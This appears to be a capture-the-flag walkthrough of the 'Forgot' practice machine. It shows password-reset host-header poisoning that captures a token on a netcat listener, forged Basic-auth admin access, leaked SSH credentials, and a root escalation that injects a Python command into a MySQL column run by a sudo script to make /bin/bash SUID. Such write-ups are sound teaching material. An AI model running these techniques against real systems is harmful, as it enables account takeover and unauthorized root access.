<h2>Target: 10.129.133.138  Forgot</h2><br>

<b>Initial Access:</b><br>
nmap -Pn 10.129.133.138 --min-rate=5000 -p- |grep open|awk -F '/' '{print $1}' |tr '\n' ',' <br>
Output shows open ports: 22,80

Enumerate these open ports further with nmap:<br>
nmap -Pn 10.129.133.138 -p 22,80 -sC -sV -oN nmap.forgot
 
![image](https://user-images.githubusercontent.com/93153300/201947302-bb5408a3-e94f-4938-b419-3fbc988b72e9.png)

Visiting port 80 shows a login page:
 
![image](https://user-images.githubusercontent.com/93153300/201947357-422a089f-c611-40d0-9b36-44490f44bc59.png)
 
Click on the ‘Forgot The Password’.  We get taken to a directory ‘/forgot’.  

![image](https://user-images.githubusercontent.com/93153300/201947385-9ebd23ba-f239-494d-bdd5-9e8f3da111eb.png)

If we put a non-existing username in the ‘username’ field and click on ‘reset’ then it responds ‘Invalid Username’:
 
![image](https://user-images.githubusercontent.com/93153300/201947422-928a6077-a01a-4e85-a408-e2eba7b867b3.png)

However, if we put an existing username then the response is different:

![image](https://user-images.githubusercontent.com/93153300/201947462-42c95476-4ea9-4cff-a5bc-835bc3ace555.png)

Based on the response being different, it seems to indicate that the username exists.  

Google search 'forgot password exploit' → found hacktricks page https://book.hacktricks.xyz/pentesting-web/reset-password:

Picture from hacktricks explaining this attack: 
 
![image](https://user-images.githubusercontent.com/93153300/201947505-3feaf0b0-d210-462f-982b-e1c96092f5da.png)

Based on the hacktricks page above, the way this attack works is that we capture the ‘/forgot’ request with burp suite, change the host in burp suite to our ip address, and then wait to capture the token on our netcat listener.  But before we do that, Hacktricks shows that we need a valid username to send this 'forgot password' request to.  Looking over the source code to http://10.129.71.235 we find a possible username ‘robert-dev-142522’: 
 
![image](https://user-images.githubusercontent.com/93153300/201947547-2bcf4456-add4-440d-b24a-f0188f279428.png)
  
Check if this is a valid username by putting the username into the ‘username’ field on http://10.129.71.235/forgot:
 
![image](https://user-images.githubusercontent.com/93153300/201947581-4df7cb0b-40f8-473b-8fc6-144e118fe396.png)

*[Machine required a few restarts at this point, so the target ip address changed a few times]

The response confirms the username is valid.  We are ready to run the attack:<br>
Step 1: Open a netcat listener: nc -lvnp 443 <br>
Step 2: In directory ‘/forgot’, enter ‘robert-dev-142522’ in the ‘username’ field, then click on ‘reset’ and capture the request in burp suite. <br>
Step 3: In the burp suite capture, change the ‘Host: target ip’ to ‘Host: our ip’, then click ‘forward’ in burp suite.  

![image](https://user-images.githubusercontent.com/93153300/201947616-c5299dff-e32e-4d92-b819-2c0fc3d2508e.png)

Step 4: Send the request again, but this time don't capture or change anything.  So in directory '/forgot' enter 'robert-dev-142522’ in the ‘username’ field, then click on ‘reset’.<br>
Step 5: Wait a little bit, and we get the token on our netcat listener: 
 
![image](https://user-images.githubusercontent.com/93153300/201947691-070f5c55-b868-4f04-96d2-3ee984272b9d.png)

Our netcat listener captured the token and shows a directory ‘/reset’.  Visit directory ‘/reset’:  
 
![image](https://user-images.githubusercontent.com/93153300/201947726-1b4b7020-294f-423d-b281-8288068d2384.png)

Enter something for ‘password’ and ‘confirm password’ (I will enter 'newpassword'). Click on ‘save’ then capture the request in burp suite.  Then paste in the url captured in our netcat of /reset?token=a0t44eXqT+vanMHyPlO1MyBkA2O/WYxYZYZxUlQQqZyxT1QmS0u10JcfYKtMWobVGuk7uvKnrHTV9pOmikV69w==.  Next, url encode all characters of the token.  Finally, forward the request in burp suite.  

Now that the password was changed, go back to the login page on http://10.129.133.138 and login with username ‘robert-dev-142522’ and the new password.  After login, we get directed to a directory ‘/home’.     
 
![image](https://user-images.githubusercontent.com/93153300/201947771-7660ea77-05f7-448f-9170-258acd8898b0.png)

The source code on this page shows a directory ‘/admin_tickets’.<br>
Visit directory '/admin_tickets' and capture the request in burp suite.  The burp suite capture shows an 'Authorization Basic' with a base64 encoded string. This base64 encoded string is just the username and password base64 encoded.  Decoding the current string shows 'robert-dev-142522:newpassword'.

Change the Authorization Basic string to be base64 of the string 'admin:newpassword'.  To do this use command: echo -n ‘admin:newpassword’ |base64 -w 0 <br>
Replace the current 'Authorization Basic' base64 encoded string we captured in burp suite with the new base64 encoded string we created for 'admin:newpassword'. Then forward the request in burp suite.  After doing this, we get a new page showing:
 
![image](https://user-images.githubusercontent.com/93153300/201947837-7abff5b7-a161-4d14-854b-35ea0c96f8f4.png)

This page shows credentials username ‘diego’ password ‘dCb#1!x0%gjq’.  Use these credentials to login as diego via ssh: ssh diego@10.129.72.7 → when prompted for password then enter the password.  

We now have shell as user diego.  We can get the flag at /home/diego/user.txt.
_________________________________________________________________________
<b>Privilege Escalation:</b><br>
File /home/diego/bot.py shows mysql credentials: 

![image](https://user-images.githubusercontent.com/93153300/201947871-ab312b76-bd73-4176-b5ef-73dc53430411.png)

File bot.py shows that mysql credentials are the same as diego’s credentials. <br>
Run command ‘sudo -l’:

![image](https://user-images.githubusercontent.com/93153300/201947920-6df2bd2f-f86d-419a-a08e-8d839356df4c.png)

‘sudo -l’ command shows we can run sudo on file ‘/opt/secuirty/ml_security.py’.  Open the file ‘/opt/secuirty/ml_security.py’.  There’s a lot to read, but an important part of this file is: 
 
![image](https://user-images.githubusercontent.com/93153300/201950496-2a805a43-3937-452c-bfb7-dbf7482b16c4.png)
  
This shows that it will log into mysql, use the database ‘app’, then take the value in column ‘reason’ from the table ‘escalate’ and execute that value.  Based on the fact that we can run this file with sudo privileges, if we can insert values in the column ‘reason’ then we can run commands.  Let’s check if we can access column ‘reason’, and if we have privileges to insert  values in it.  

Log into mysql: mysql -u diego -p → when prompted for password then enter the password.<br>
Show the databases with command: show databases;
 
![image](https://user-images.githubusercontent.com/93153300/201950525-cbc18e7c-e82a-4663-87ab-a9e942c94612.png)

Select database ‘app’ with command: use app;<br>
Look at the tables in ‘app’ with command: show tables;
 
![image](https://user-images.githubusercontent.com/93153300/201950553-9a7ab113-1654-4b2e-89e8-cc10435811a9.png)
 
Look at the columns of table ‘escalate’ with command: describe escalate; 

![image](https://user-images.githubusercontent.com/93153300/201950591-f49a19dd-f5e7-4979-b796-c9c902b45fed.png)
 
We have found the column ‘reason’ we were looking for.  Now, check if we have privileges to insert values into column ‘reason’ with command: show grants;
 
![image](https://user-images.githubusercontent.com/93153300/201950627-d6c4d587-102d-4a18-92f9-a60de1990761.png)

This shows that we have privileges to insert values.   We will use this to escalate to root. <br>
Insert into the column 'reason' a malicious command: INSERT INTO escalate VALUES ("1","1","1",'blob=exec("""\nimport os\nos.system("chmod +s /bin/bash")""")');

The command we inserted will change the permissions on the file '/bin/bash' to be a suid. <br>
Run command: sudo /opt/security/ml_security.py <br>
The sudo command changed the permissions on file ‘/bin/bash’  to be a suid.  Run ‘/bin/bash -p’.  <br>
We are now root.  We can get the flag in /root/root.txt
